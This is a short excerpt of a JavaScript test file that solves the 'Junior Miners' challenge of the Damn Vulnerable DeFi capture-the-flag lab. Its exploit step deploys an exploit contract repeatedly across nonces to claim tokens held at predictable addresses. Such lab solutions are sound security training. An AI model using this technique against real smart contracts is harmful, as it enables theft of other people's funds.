...
describe("[Challenge] Junior Miners", function () {
  ...
  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE - https://ventral.digital/posts/2022/7/2/damn-vulnerable-defi-v2-13-junior-miners */
    ...
    for (let nonce = 0; nonce < 100; nonce++) {
      ...
      await (
        await ethers.getContractFactory("JuniorMinersExploit", deployer)
      ).deploy(attacker.address, this.token.address, 100);
      await (
        await ethers.getContractFactory("JuniorMinersExploit", attacker)
      ).deploy(attacker.address, this.token.address, 100);
    }
  });
